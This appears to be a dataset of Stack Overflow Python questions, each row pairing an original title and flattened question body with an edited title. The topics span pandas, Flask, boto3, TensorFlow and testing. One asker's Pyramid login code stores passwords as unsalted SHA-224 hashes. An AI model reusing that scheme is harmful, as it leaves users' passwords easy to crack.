Difference in complexity of append and concatenate for lists," Consider below methods for forming a list of thousand numbers. Output: Why is the append method around 20 times better than concatenation. AFAIK append has O(1) complexity while concatenation has O(k) complexity. While K here is 1.Is there some obvious thing I overlooked?  <code>  def test1(): l = [] for i in range(1000): l = l + [i] return ldef test2(): l = [] for i in range(1000): l.append(i) print timeit.repeat(stmt=test1, number=100,repeat=2)print timeit.repeat(stmt=test2, number=100,repeat=2) [0.30474191033602543, 0.3783786557587963][0.015134341605235302, 0.023081246200096328]",Difference in complexity of append and concatenate for this list code?
How to use Mock.ANY with assert_called_with," I'm blocked.I'm creating tests with nosetests and Mock. It's very, very hard for me to understand how to do this properly.Here I want to make sure subprocess.check_output is called with the right parameters.I get this error message: Isn't mock.ANY a wildcard ? Did I misunderstand something ?I'm not sensible, please tell me if I'm being stupid.KerbMinder2.py: test_KerbMinder2.py: RESULT <code>  AssertionError: Expected call: check_output(['dscl', '/Search', 'read', '/Users/testuser', 'AuthenticationAuthority'], <ANY>)Actual call: check_output(['dscl', '/Search', 'read', '/Users/testuser', 'AuthenticationAuthority'], stderr=-2) def get_current_username():""""""Returns the user associated with the LaunchAgent running KerbMinder.py"""""" return getpass.getuser()@staticmethoddef get_principal_from_ad(): """"""Returns the principal of the current user when computer is bound"""""" import re user_path = '/Users/' + get_current_username() try: output = subprocess.check_output(['dscl', '/Search', 'read', user_path, 'AuthenticationAuthority'], stderr=subprocess.STDOUT) match = re.search(r'[a-zA-Z0-9+_\-\.]+@[^;]+\.[A-Z]{2,}', output, re.IGNORECASE) match = match.group() except subprocess.CalledProcessError as error: log_print(""Can't find Principal from AD: "" + str(error)) else: log_print('Kerberos Principal is ' + match) return match @patch('KerbMinder2.get_current_username')def test_ad_bound_notenabled(self, mock_get_current_username): #https://github.com/nens/nensbuild/blob/master/nensbuild/tests.py mock_get_current_username.return_value = ""testuser"" _return_value = 'AuthenticationAuthority: ;ShadowHash;HASHLIST:' \ '<SMB-NT,CRAM-MD5,RECOVERABLE,SALTED-SHA512-PBKDF2> ' \ ';LocalCachedUser;/Active Directory/TEST/test.com:testuser' \ ':9A1F2D0C-B782-488A-80BA-CAC95AB6CAE9 ;Kerberosv5;;testuser@TEST.COM;' \ 'TEST.COM; AuthenticationAuthority: ;Kerberosv5;;testuser@TEST.COM;TEST.COM; ' \ ';NetLogon;testuser;TEST' with patch('subprocess.check_output', return_value = _return_value) as check_output: nose.tools.eq_(Principal.get_principal_from_ad(), ""testuser@TEST.COM"") check_output.assert_called_with(['dscl', '/Search', 'read', '/Users/testuser', 'AuthenticationAuthority'], ANY) test_ad_bound_notenabled (test_KerbMinder2.TestPrincipal) ... FAILFailureTraceback (most recent call last): File ""/usr/local/Cellar/python/2.7.10_2/Frameworks/Python.framework/Versions/2.7/lib/python2.7/unittest/case.py"", line 331, in run testMethod() File ""/Users/francois/venv-KerbMinder2/lib/python2.7/site-packages/mock/mock.py"", line 1305, in patched return func(*args, **keywargs) File ""/Users/francois/Git/KerbMinder2/Library/Application Support/crankd/test_KerbMinder2.py"", line 61, in test_ad_bound_notenabled ANY) File ""/Users/francois/venv-KerbMinder2/lib/python2.7/site-packages/mock/mock.py"", line 937, in assert_called_with six.raise_from(AssertionError(_error_message(cause)), cause) File ""/Users/francois/venv-KerbMinder2/lib/python2.7/site-packages/six.py"", line 718, in raise_from raise valueAssertionError: Expected call: check_output(['dscl', '/Search', 'read', '/Users/testuser', 'AuthenticationAuthority'], <ANY>)Actual call: check_output(['dscl', '/Search', 'read', '/Users/testuser', 'AuthenticationAuthority'], stderr=-2)-------------------- >> begin captured stdout << ---------------------Kerberos Principal is testuser@TEST.COM--------------------- >> end captured stdout << ----------------------",How to use mock.ANY with assert_called_with
Paramiko send CTRL+C to an ssh shell," I'm invoking a shell using Paramiko in order to use a CLI over an ssh connection. The problem with this CLI is if I do not close it specifically using CTRL+C, the program will not be able to be opened again without rebooting my system.I've tried the below commands: is there another way to call these? Again, I've established an SSH connection using paramiko.SSHClient() and then invoked a shell using ssh.invoke_shell() and now i need to send CTRL+C to that shell to close the shell (not the ssh connection) <code>  SSH.send(""^C\n"")SSH.send(""\x003"")",Python Paramiko send CTRL+C to an ssh shell
"Prevent access to instance variable from subclass, without affecting base class"," Say I have a simple class Foo, which comes from an external library, thus I cannot change it directly: I want to create a subclass Bar and prevent x from being change from an instance of Bar, but still use the x in Bar's methods.Here's what I tried, and it will probably enlighten the basic idea, but unfortunately it doesn't work: So basically I've created some wrapper functions (do_stuff()) around an attribute, and now I want to prevent the attribute from being changed directly, as it might mess up some functionality of the wrapper functions. Is this possible in a reasonable way?Edited with a better example of what I want. I'm not trying to prevent them from seeing the variable x, but instead changing it from outside of do_stuff() <code>  class Foo(object): def __init__(self, x): self.x = x class Bar(Foo): @property def x(self): return super().x @x.setter def x(self, value): raise NotImplementedError('Do not change x directly, use ""do_stuff()"" instead') def do_stuff(self, value): if <something>: super().x = value","Prevent access to an instance variable from subclass, without affecting base class"
How to chosse AWS profile using Boto3 to connect to CloudFront," I am using the Boto 3 python library, and want to connect to AWS CloudFront.I need to specify the correct AWS Profile (AWS Credentials), but looking at the official documentation, I see no way to specify it.I am initializing the client using the code:client = boto3.client('cloudfront')However, this results in it using the default profile to connect.I couldn't find a method where I can specify which profile to use. <code> ",How to choose an AWS profile when using boto3 to connect to CloudFront
How to chose an AWS profile when using boto3 to connect to CloudFront," I am using the Boto 3 python library, and want to connect to AWS CloudFront.I need to specify the correct AWS Profile (AWS Credentials), but looking at the official documentation, I see no way to specify it.I am initializing the client using the code:client = boto3.client('cloudfront')However, this results in it using the default profile to connect.I couldn't find a method where I can specify which profile to use. <code> ",How to choose an AWS profile when using boto3 to connect to CloudFront
Networkx : How to create edges from a csv file?," I am trying to create a graph using networkx and so far I have created nodes from the following text files :File 1(user_id.txt) sample data : File 2(user_country.txt) sample data : contains few blank lines too in case if user didn't enter his country details File 3(user_agegroup.txt) data : contains four age groups I have other two files with following sample data for adding edges in the graphFile 4(id,agegroup.txt) File 5(id,country.txt) So far I have written following code to draw graphs with only nodes: (Please check the code because print g.number_of_nodes() never prints correct no. of nodes though print g.nodes()shows correct no. of nodes.) Besides this I can't figure out how to add edges from file4 and file5. Any help with code for that is appreciated. Thanks.  <code>  user_000001user_000002user_000003user_000004user_000005user_000006user_000007 Japan Peru United States Bulgaria Russian Federation United States [12-18],[19-25],[26-32],[33-39] user_000001,[19-25]user_000002,[19-25]user_000003,[33-39]user_000004,[19-25]user_000005,[19-25]user_000006,[19-25]user_000007,[26-32] (user_000001,Japan)(user_000002,Peru)(user_000003,United States)(user_000004,)(user_000005,Bulgaria)(user_000006,Russian Federation)(user_000007,United States) import csvimport networkx as nximport matplotlib.pyplot as pltg=nx.Graph()#extract and add AGE_GROUP nodes in graphf1 = csv.reader(open(""user_agegroup.txt"",""rb""))for row in f1: g.add_nodes_from(row) nx.draw_circular(g,node_color='blue')#extract and add COUNTRY nodes in graphf2 = csv.reader(open('user_country.txt','rb'))for row in f2: g.add_nodes_from(row) nx.draw_circular(g,node_color='red')#extract and add USER_ID nodes in graphf3 = csv.reader(open('user_id.txt','rb'))for row in f3: g.add_nodes_from(row) nx.draw_random(g,node_color='yellow')print g.nodes()plt.savefig(""path.png"")print g.number_of_nodes()plt.show()",Networkx : How to create graph edges from a csv file?
Python 3 - iterating through array," I have an array of bools and now I want to swap those entries for numbers. I have written two different pieces of code and I would like to know, which one is better and why. This is not so much about actually solving the problem, as about learning. And the second approach: I read that there are ways to do this with importing itertools or similar. I am really not a fan of importing things if it can be done with on-board tools, but should I rather be using them for this problem? <code>  False => 0True => 1 arr = [[True,False],[False,True],[True,True]]for i,row in enumerate(arr): for j,entry in enumerate(row): if entry: arr[i][j] = 1 else: arr[i][j] = 0print(arr) arr = [[True,False],[False,True],[True,True]]for i in range(len(arr)): for j in range(len(arr[i])): if arr[i][j]: arr[i][j] = 1 else: arr[i][j] = 0 print(arr)",Iterating through array
quote_plus urlencode filter in jinja," There is a urlencode filter in Jinja, which can be used with {{ url | urlencode }}, but I'm looking for a ""plus"" version that replaces spaces with + instead of %20, like urllib.quote_plus(). Is there anything off the shelf or is it a time for a custom filter? <code> ",quote_plus URL-encode filter in Jinja2
Is there a way to convert unicode to the nearest ansi equivalent?," I will give the example from Turkish, for example """" becomes ""sgui""I'm sure each language has it's own conversion methods, sometimes a character might be converted to multiple ASCII characters, like ""alpha""/""phi"" etc.I'm wondering whether there is a library/method that achieves this conversion <code> ",Is there a way to convert unicode to the nearest ASCII equivalent?
"I have a function and want to apply it on every row on a dataframe, how to do that"," I am new to Python and I am not sure how to solve the following problem.I have a function: Say I have the dataframe And ch and ck are float types. Now I want to apply the formula to every row on the dataframe and return it as an extra row 'Q'. An example (that does not work) would be: (returns only 'map' types)I will need this type of processing more in my project and I hope to find something that works. <code>  def EOQ(D,p,ck,ch): Q = math.sqrt((2*D*ck)/(ch*p)) return Q df = pd.DataFrame({""D"": [10,20,30], ""p"": [20, 30, 10]}) D p0 10 201 20 302 30 10ch=0.2ck=5 df['Q']= map(lambda p, D: EOQ(D,p,ck,ch),df['p'], df['D']) ",How to apply a function on every row on a dataframe?
Print human friedly Protobuf message in Python, I couldn't find anywhere a possibility to print a human friendly content of a Google Protobuf message.Is there an equivalent in Python for Java's toString() or C++'s DebugString()? <code> ,Print human friendly Protobuf message
How to clone an scikit-learn estimator including it's data?," I am attempting to perform a partial fit of on an naive-bayes estimator but also retain a copy of the estimator prior to the partial fit. sklearn.base.clone only clones an estimators parameters, not it's data, so is not useful in this case. Performing a partial fit on the clone only uses the data added during the partial fit, since the clone is effectively empty. In the above example fit_model and fit_model2 will be the same since they both point to the same object. I would like to retain the original copy unaltered. My workaround is to pickle the original and load it into a new object to perform a partial fit on. Like this: Also I can completely refit with the new data each time, but since I need to perform this thousands of times I'm trying to find something more efficient. <code>  from sklearn.naive_bayes import MultinomialNBmodel = MultinomialNB()fit_model = model.fit(np.array(X),np.array(y))fit_model2 = model.partial_fit = (np.array(Z),np.array(w)),np.unique(y)) model = MultinomialNB()fit_model = model.fit(np.array(X),np.array(y))import picklewith open('saved_model', 'wb') as f: pickle.dump([model], f)with open('saved_model', 'rb') as f: [model2] = pickle.load(f) fit_model2 = model2.partial_fit(np.array(Z),np.array(w)),np.unique(y))",How to clone an scikit-learn estimator including its data?
Reading png with PIL in python, I am reading a PNG file in Python. I want the RGB values for each pixel in the image: For a JPEG file the pixels are a tuple but for PNGs I am getting a single integer. How should I read PNG images with Python to get the pixel values? <code>  img = Image.open(path) pixels = img.load(),Reading PNG with PIL in Python
Trying to install tensorflow -- errors while uninstalling with pip," I've run this command to pip install TensorFlow: But I'm having trouble removing six (to reinstall it anyway?)Does anyone have any insight into this problem. pip uninstall six doesn't work eithermy terminal is spitting out: <code>  pip install https://storage.googleapis.com/tensorflow/linux/cpu/tensorflow-0.5.0-cp27-none-linux_x86_64.whl Collecting tensorflow==0.5.0 from https://storage.googleapis.com/tensorflow/linux/cpu/tensorflow-0.5.0-cp27-none-linux_x86_64.whl Using cached https://storage.googleapis.com/tensorflow/linux/cpu/tensorflow-0.5.0-cp27-none-linux_x86_64.whlCollecting six>=1.10.0 (from tensorflow==0.5.0) Using cached six-1.10.0-py2.py3-none-any.whlCollecting numpy>=1.9.2 (from tensorflow==0.5.0)Installing collected packages: six, numpy, tensorflow Found existing installation: six 1.9.0 Uninstalling six-1.9.0:Exception:Traceback (most recent call last): File ""/usr/local/lib/python2.7/site-packages/pip/basecommand.py"", line 211, in main status = self.run(options, args) File ""/usr/local/lib/python2.7/site-packages/pip/commands/install.py"", line 311, in run root=options.root_path, File ""/usr/local/lib/python2.7/site-packages/pip/req/req_set.py"", line 640, in install requirement.uninstall(auto_confirm=True) File ""/usr/local/lib/python2.7/site-packages/pip/req/req_install.py"", line 716, in uninstall paths_to_remove.remove(auto_confirm) File ""/usr/local/lib/python2.7/site-packages/pip/req/req_uninstall.py"", line 125, in remove renames(path, new_path) File ""/usr/local/lib/python2.7/site-packages/pip/utils/__init__.py"", line 315, in renames shutil.move(old, new) File ""/usr/local/lib/python2.7/shutil.py"", line 303, in move os.unlink(src)OSError: [Errno 13] Permission denied: '/usr/local/lib/python2.7/site-packages/six-1.9.0.dist-info/DESCRIPTION.rst'",Why I don't have permissions to remove six while installing a pip package?
argparse subcommands has common parents options run error," When using argparse, some subcommands need the same options and I'm using parents to avoid repeatedly defining them in every sub-command. script filename: testarg.py But when I run command: expecting output: What am I missing? <code>  import argparse parser = argparse.ArgumentParser(add_help=False) parser.add_argument('-H', '--host', default='192.168.122.1') parser.add_argument('-P', '--port', default='12345') subparsers = parser.add_subparsers() # subcommand a parser_a = subparsers.add_parser('a', parents=[parser]) parser_a.add_argument('-D', '--daemon', action='store_true') parser_a.add_argument('-L', '--log', default='/tmp/test.log') # subcommand b parser_b = subparsers.add_parser('b', parents=[parser]) parser_b.add_argument('-D', '--daemon', action='store_true') # subcommand c parser_c = subparsers.add_parser('c', parents=[parser]) args = parser.parse_args() print args >>>./testarg.py ausage: testarg.py a [-h] [-H HOST] [-P PORT] [-D] [-L LOG] {a,b,c} ...testarg.py a: error: too few arguments >>>./testarg.py aNamespace(daemon=False, host='192.168.122.1', log='/tmp/test.log', port='12345')>>>./testarg.py b -H 127.0.0.1 -P 11111Namespace(daemon=False, host='127.0.0.1', port='11111')>>>./testarg.py cNamespace(host='192.168.122.1', port='12345')also, >>>./testarg.py c -H 127.0.0.1 -P 12222Namespace(host='127.0.0.1', port='12222')",How to add common arguments to argparse subcommands?
Starting asystemd service via python," Is there a way to start/restart a systemd service via python?I know that I can make a system call - but then I also could write this in shell script... I heared systemd has some python binds, but as far as I saw it they only cover the journal <code>  from subprocess import callcall([""systemctl"", ""restart service""])",Starting a systemd service via python
How to access variables from different classes in tkinter python 3," I have been searching a lot and I still don't know how you access variables from different classes in python. In this case I want to access the variable self.v from PageOne class to PageTwo class.Here is my code. <code>  import tkinter as tkimport smtplibTITLE_FONT = (""Helvetica"", 18, ""bold"")class SampleApp(tk.Tk): def __init__(self): tk.Tk.__init__(self) container = tk.Frame(self) container.pack(side=""top"", fill=""both"", expand=True) container.grid_rowconfigure(0, weight=1) container.grid_columnconfigure(0, weight=1) self.frames = {} for F in (StartPage, PageOne, PageTwo): frame = F(container, self) self.frames[F] = frame frame.grid(row=0, column=0, sticky=""nsew"") self.show_frame(StartPage) def show_frame(self, c): frame = self.frames[c] frame.tkraise()class StartPage(tk.Frame): def __init__(self, parent, controller): tk.Frame.__init__(self, parent) label = tk.Label(self, text=""PyMail"",foreground = ""Red"", font=(""Courier"", 30, ""bold"")) label.pack(side=""top"") sublabel = tk.Label(self, text=""Bringing you the\n the easiest way of communication"", font=(""Courier"", 15)) sublabel.pack() wallpaper = tk.PhotoImage(file='Python-logo-notext.gif') img = tk.Label(self, image=wallpaper) img.image = wallpaper img.pack(side=""top"", expand = True) button1 = tk.Button(self, text=""Click Here to Login to your account"",fg=""red"", command=lambda: controller.show_frame(PageOne)) button2 = tk.Button(self, text=""Go to Page Two"", command=lambda: controller.show_frame(PageTwo)) button2.pack(side=""bottom"") button1.pack(side=""bottom"")class PageOne(tk.Frame): def __init__(self, parent, controller): tk.Frame.__init__(self, parent) self.controller=controller label = tk.Label(self, text=""Personal Information"", font=TITLE_FONT, foreground=""blue"") label.pack(side=""top"", fill=""x"", pady=10) global optionv self.optionv = tk.StringVar() self.optionv.set(""---Select One---"") optionm = tk.OptionMenu(self, self.optionv, ""---Select One---"", ""@gmail.com"", ""@yahoo.com"", ""@hotmail.com"") t1 = tk.Label(self, text=""Email Account: "") self.v = tk.StringVar() self.v.set("""") entry1 = tk.Entry(self, textvariable=self.v) t2 = tk.Label(self,text=""\nPassword: "") self.pwd = tk.StringVar() self.pwd.set("""") entry2 = tk.Entry(self, textvariable=self.pwd) entry2.config(show=""*"") lgbutton=tk.Button(self, text=""Log In"", command=self.login) button = tk.Button(self, text=""Go to the start page"", command=lambda: controller.show_frame(StartPage)) #final = tk.Label(self, textvariable=self.v) #finalpwd = tk.Label(self, textvariable=self.pwd) t1.pack() entry1.pack() optionm.pack() t2.pack() entry2.pack() #final.pack() #finalpwd.pack() lgbutton.pack() button.pack(side=""bottom"") def login(self): value = tk.Label(self, text=""Invalid username / password"", font=(""Courier"", 15, ""bold""), foreground=""red"") success = tk.Label(self, text=""Login was Successful \n (Click """"Continue"""" to compose email)"", font=(""Courier"", 15, ""bold""), foreground=""blue"") cbutton = tk.Button(self, text=""Continue"", command=lambda: self.controller.show_frame(PageTwo)) status = tk.Label(self, text=""Please select your email domain"", foreground=""red"") if self.optionv.get() == ""@gmail.com"": try: global server server = smtplib.SMTP(""smtp.gmail.com"", 587) server.ehlo() server.starttls() server.login(self.v.get()+self.optionv.get(), self.pwd.get()) success.pack() cbutton.pack(side=""bottom"") except: value.pack() elif self.optionv.get() == ""@yahoo.com"": try: server = smtplib.SMTP(""smtp.yahoo.com"", 587) server.ehlo() server.starttls() server.login(self.v.get()+self.optionv.get(), self.pwd.get()) success.pack() cbutton.pack(side=""bottom"") except: value.pack() elif self.optionv.get() == ""@hotmail.com"": try: server = smtplib.SMTP(""smtp.live.com"", 587) server.ehlo() server.starttls() server.login(self.v.get()+self.optionv.get(), self.pwd.get()) success.pack() cbutton.pack(side=""bottom"") except: value.pack() else: status.pack()class PageTwo(tk.Frame): def __init__(self, parent, controller): tk.Frame.__init__(self, parent) label = tk.Label(self, text=""Compose Mail"", font=TITLE_FONT, foreground=""green"") label.pack(side=""top"", fill=""x"", pady=10) self.reciever = tk.StringVar() self.reciever.set("""") senderl = tk.Label(self, text=""Send to: "") rmail = tk.Entry(self, textvariable=self.reciever) self.senderoption = tk.StringVar() self.senderoption.set(""---Select One---"") senderdomain = tk.OptionMenu(self, self.senderoption, ""---Select One---"", ""@gmail.com"", ""@hotmail.com"", ""@yahoo.com"") self.mail = tk.StringVar() self.mail.set("""") self.textw = tk.Entry(self, textvariable=self.mail) button = tk.Button(self, text=""Go to the start page"", command=lambda: controller.show_frame(StartPage)) sendbutton = tk.Button(self, text = ""Send Mail"", command=self.sendmail) senderl.pack(side=""top"", anchor=""w"") rmail.pack(side=""top"", anchor=""nw"") senderdomain.pack(side=""top"", anchor=""nw"") self.textw.pack(fill=""both"") button.pack(side=""bottom"") sendbutton.pack(side=""bottom"") def sendmail(self): sent = tk.Label(self, text=""Email has been sent"") if self.senderoption.get() == ""@gmail.com"": try: server.sendmail(self.v.get()+self.optionv.get(), self.reciever.get()+self.senderoption.get(), ""YES"") print(""Success"") sent.pack() except: print(""Unsuccesful"") print(PageOne.self.v.get())if __name__ == ""__main__"": app = SampleApp() app.title(""PyMail"") app.geometry(""400x400"") app.mainloop()",How to access variables from different classes in tkinter?
Forcing Numpy to recompile," This question is as much a question about my particular problem (which I sort of found a work-around, so it's not a burning issue) as it is about the general process I am using.Setup (the part that works):I have Python 2.7.9 installed locally on my Ubuntu 14.04, and I have a virtualenv in which I am running it. Everything is very much separated from the ""system"" Python, which I am not touching.The part I did:It all started well enough, with my Python installed and all libraries running. For example, I also pip installed numpy 1.10.1, it compiled for a while, then it worked just fine.The problem:The problem is that for reasons beyond my control, I had to rebuild the python with ucs4 enabled, that is I installed it using After doing this, I also uninstalled all libraries and reinstalled them using pip. However, it seems that the numpy library was not properly uninstalled because it installed instantly this time, and when I tried to import numpy into my new Python, I got an error message indicating that the numpy was compiled with the ucs2-enabled Python.This hypothesis is pretty solid, since I tried then to pip install numpy==1.9.3. The installation once again took a long time, and it produced a numpy version that works on the new ucs4 enabled Python.Now, my question:How can I get the numpy uninstallation process to delete all traces of the old numpy?Edit:I also tried to manually remove numpy by deleting it from my virtualenv site-packages directory. After deleting, import numpy returned an ImportError as expected. I then reinstalled it (pip install numpy) and it came back with the same ucs2-related error.Edit 2:The full sys.path seen by my virtualenv Python is Also, it might be important to mention that the /usr/local/lib/python2.7.9/ installation of python does not have numpy installed. <code>  ./configure --enable-unicode=ucs4 ['', '/home/jkralj/.virtualenvs/work/lib/python27.zip', '/home/jkralj/.virtualenvs/work/lib/python2.7', '/home/jkralj/.virtualenvs/work/lib/python2.7/plat-linux2', '/home/jkralj/.virtualenvs/work/lib/python2.7/lib-tk', '/home/jkralj/.virtualenvs/work/lib/python2.7/lib-old', '/home/jkralj/.virtualenvs/work/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7.9/lib/python2.7', '/usr/local/lib/python2.7.9/lib/python2.7/plat-linux2', '/usr/local/lib/python2.7.9/lib/python2.7/lib-tk', '/home/jkralj/.virtualenvs/work/lib/python2.7/site-packages']",Forcing `pip` to recompile a previously installed package (numpy) after switching to a different Python binary
How to extend python enum?, What is best practice for extending Enum type in Python 3.4 and is there even a possibility for do this?For example: Currently there is no possible way to create a base enum class with members and use it in other enum classes (like in the example above). Is there any other way to implement inheritance for Python enums? <code>  from enum import Enumclass EventStatus(Enum): success = 0 failure = 1class BookingStatus(EventStatus): duplicate = 2 unknown = 3Traceback (most recent call last):...TypeError: Cannot extend enumerations,How to extend Python Enum?
LOGIN: Validating encrypted passwords," I am trying to validate an encrypted password for login purposes in Pyramid. So that if the user and password match then the system will authorize the user. At the moment I am finding it difficult to write a function to compare passwords when one is encrypted in the database and the the password being entered into Pyramid's login form is unencrypted. Right now, I have no verification occurring in the login view.I am new to this entire process of working with security measures/code and want to do this right. I was looking at this Auth tutorial, however the encryption in the User class is slightly different and I am using Pyramid's Auth kit. Any guidance on how to do this successfully and smartly would be highly appreciated. Software: Python 2.7.9, Pyramid 1.5.7, SQLAlchemy 1.0.9database class: views <code>  class User(Base): __tablename__ = 'users' id = Column(Integer, primary_key=True) username = Column(String(15), nullable=False, unique=True) email = Column(String(300)) password = Column(String(300), nullable=False) def __init__(self, username, password, email): self.username = username self.password = hashlib.sha224(password).hexdigest() self.email = email def __repr__(self): return ""<User(username ='%s', password='%s', email='%s')>"" % (self.username, self.password, self.email) @view_config(route_name='login', renderer='templates/login.jinja2')@forbidden_view_config(renderer='templates/login.jinja2')def login(request): login_url = request.route_url('login') referrer = request.url if referrer == login_url: referrer = '/' # never use the login form itself as came_from came_from = request.params.get('came_from', referrer) message = '' login = '' password = '' if 'form.submitted' in request.params: login = request.params['login'] password = request.params['password'] user = api.retrieve_user(login) # need some way to validate password if user is not None: # need to check user/password here, redirect if wrong headers = remember(request, login) return HTTPFound(location = came_from, headers = headers) message = 'Failed login' return dict( message = message, url = request.application_url + '/login', came_from = came_from, login = login, password = password, )",Storing and validating encrypted password for login in Pyramid
SQLAlchemy: who needs SQLALCHEMY_TRACK_MODIFICATIONS?," Every time I run my app that uses Flask-SQLAlchemy I get the following warning that the SQLALCHEMY_TRACK_MODIFICATIONS option will be disabled. I tried to find out what this option does, but the Flask-SQLAlchemy documentation isn't clear about what uses this tracking. SQLALCHEMY_TRACK_MODIFICATIONS If set to True (the default) Flask-SQLAlchemy will track modifications of objects and emit signals. This requires extra memory and can be disabled if not needed.How do I find out if my project requires SQLALCHEMY_TRACK_MODIFICATIONS = True or if I can safely disable this feature and save memory on my server? <code>  /home/david/.virtualenvs/flask-sqlalchemy/lib/python3.5/site-packages/flask_sqlalchemy/__init__.py:800: UserWarning: SQLALCHEMY_TRACK_MODIFICATIONS adds significant overhead and will be disabled by default in the future. Set it to True to suppress this warning. warnings.warn('SQLALCHEMY_TRACK_MODIFICATIONS adds significant overhead and will be disabled by default in the future. Set it to True to suppress this warning.')",How do I know if I can disable SQLALCHEMY_TRACK_MODIFICATIONS?
Python Joblib Parallel loop on windows," I am trying to run a parallel loop on a simple example.What am I doing wrong? The problem with the code is that when executed under Windows environments in Python 3, it opens num_cores instances of python to execute the parallel jobs but only one is active. This should not be the case since the activity of the processor should be 100% instead of 14% (under i7 - 8 logic cores).Why are the extra instances not doing anything? <code>  from joblib import Parallel, delayed import multiprocessingdef processInput(i): return i * iif __name__ == '__main__': # what are your inputs, and what operation do you want to # perform on each input. For example... inputs = range(1000000) num_cores = multiprocessing.cpu_count() results = Parallel(n_jobs=4)(delayed(processInput)(i) for i in inputs) print(results)",Writing a parallel loop
import error in flask," I am trying to study how to use alembic in flask, I want to import a method in flask app: in app/__init__.py: I want to import create_app in env.py: but the error shows as below when I run the command alembic upgrade head: Any idea for this? <code>  tree .. README.md alembic README env.py env.pyc script.py.mako versions 8f167daabe6_create_account_table.py 8f167daabe6_create_account_table.pyc alembic.ini app __init__.py main __init__.py errors.py forms.py views.py models.py templates 404.html 500.html base.html index.html user.html config.py data.sqlite manage.py requirements.txt def create_app(config_name): app = Flask(__name__) from app import create_app File ""alembic/env.py"", line 5, in <module> from app import create_appImportError: No module named app",Importing app when using Alembic raises ImportError
Printing the loss during Tensor Flow training," I am looking at the TensorFlow ""MNIST For ML Beginners"" tutorial, and I want to print out the training loss after every training step.My training loop currently looks like this: Now, train_step is defined as: Where cross_entropy is the loss which I want to print out: One way to print this would be to explicitly compute cross_entropy in the training loop: I now have two questions regarding this:Given that cross_entropy is already computed during sess.run(train_step, ...), it seems inefficient to compute it twice, requiring twice the number of forward passes of all the training data. Is there a way to access the value of cross_entropy when it was computed during sess.run(train_step, ...)?How do I even print a tf.Variable? Using str(cross_entropy) gives me an error...Thank you! <code>  for i in range(100): batch_xs, batch_ys = mnist.train.next_batch(100) sess.run(train_step, feed_dict={x: batch_xs, y_: batch_ys}) train_step = tf.train.GradientDescentOptimizer(0.01).minimize(cross_entropy) cross_entropy = -tf.reduce_sum(y_ * tf.log(y)) for i in range(100): batch_xs, batch_ys = mnist.train.next_batch(100) cross_entropy = -tf.reduce_sum(y_ * tf.log(y)) print 'loss = ' + str(cross_entropy) sess.run(train_step, feed_dict={x: batch_xs, y_: batch_ys})",Printing the loss during TensorFlow training
How to parse img src?," HTML image elements have this simplified format: That something can be data-uri, for example: Is there a standard way of parsing this with python, so that I get content_type and base64 data separated, or should I create my own parser for this? <code>  <img src='something'> data:image/png;base64,iVBORw0KGg...",How to parse data-uri in python?
Python result differs from wolfram alpha?," When I run my python 3 program: results in 211^(-1).But when I run the calculation in wolfram alpha I get the result I was expecting. I did some test outputs and the variables exp, p and q in the program are all the integer values I used in wolfram alpha.My goal is to derive a private key from a (weakly) encrypted integer.If I test my wolfram alpha result, I can decrypt the encrypted message correctly.  <code>  exp = 211p = 199q = 337d = (exp ** (-1)) % ((p - 1)*(q - 1))",Python modulo result differs from wolfram alpha?
Python Anaconda Proxy Setup," I am having trouble going through a proxy for Anaconda install conda on a Windows 7 machine. How do I use a proxy?http://conda.pydata.org/docs/config.htmlthe above link is broken, use this one instead <code> ",Python Anaconda Proxy Setup via .condarc file on Windows
check if any character of a string is uppercase python," Say I have a string that can contain different characters:e.g. word = ""UPPERCASe""How would I test the string to see if all the characters are uppercase and no other punctuation, numbers, lowercase letters etc? <code> ",Check if all characters of a string are uppercase
Check if any character of a string is uppercase Python," Say I have a string that can contain different characters:e.g. word = ""UPPERCASe""How would I test the string to see if all the characters are uppercase and no other punctuation, numbers, lowercase letters etc? <code> ",Check if all characters of a string are uppercase
Minimum path between two Trie nodes," This is a twofold question, because I'm out of ideas on how to implement this most efficiently.I have a dictionary of 150,000 words, stored into a Trie implementation, here's what my particular implementation looks like: A user is given a provided with two words. With the goal being to find the shortest path of other english words (changed by one character apiece) from the start word to the end word. For example: Start: Dog End: Cat Path: Dog, Dot, Cot, Cat Path: Dog, Cog, Log, Bog, Bot, Cot, Cat Path: Dog, Doe, Joe, Joy, Jot, Cot, CatMy current implementation has gone through several iterations, but the simplest I can provide pseudocode for (as the actual code is several files): Knowns:A start word and a finish wordWords are of the same lengthWords are english wordsIt is possible for there to not be a pathQuestion:My issue is I do not have an efficient way of determining a potential word to try without brute-forcing the alphabet and checking each new word against the dictionary. I know there is a possibility of a more efficient way using prefixes, but I can't figure out a proper implementation, or one that doesn't just double the processing. Secondly, should I be using a different search algorithm, I've looked at A* and Best First Search as possibilities, but those require weights, which I don't have.Thoughts? <code>  var start = ""dog"";var end = ""cat"";var alphabet = [a, b, c, d, e .... y, z];var possible_words = [];for (var letter_of_word = 0; letter_of_word < start.length; letter_of_word++) { for (var letter_of_alphabet = 0; letter_of_alphabet < alphabet.length; letter_of_alphabet++) { var new_word = start; new_word.characterAt(letter_of_word) = alphabet[letter_of_alphabet]; if (in_dictionary(new_word)) { add_to.possible_words; } } }function bfs() { var q = []; ... usual bfs implementation here ..}",Shortest Path between two Trie Nodes
How to add suffix to each column name?," I want to add _x suffix to each column name like so: How do I do this? Additionally, if I wanted to add x_ as a suffix, how would the solution change? <code>  featuresA = myPandasDataFrame.columns.values + '_x'",How to add a suffix (or prefix) to each column name?
How to add a suffix to each column name?," I want to add _x suffix to each column name like so: How do I do this? Additionally, if I wanted to add x_ as a suffix, how would the solution change? <code>  featuresA = myPandasDataFrame.columns.values + '_x'",How to add a suffix (or prefix) to each column name?
how would i write to file python maths quiz," How would I write the scores to a file? <code>  import randomscore=0question=0for i in range(10): num1= random.randint(1,10) num2= random.randint(1,10) ops = ['+', '-', '*'] operation = random.choice(ops) Q = int(input(str(num1)+operation+str(num2))) if operation =='+': answer=num1+num2 if Q == answer: print (""correct"") score=score+1 else: print('You Fail') elif operation =='-': answer=num1-num2 if Q == answer: print (""correct"") score=score+1 else: print(""you fail"") else: answer=num1*num2 if Q == answer: print (""correct"") score=score+1 else: print(""you fail"")print(""thank you for playing your score is"",score)",How to write to file with Python?
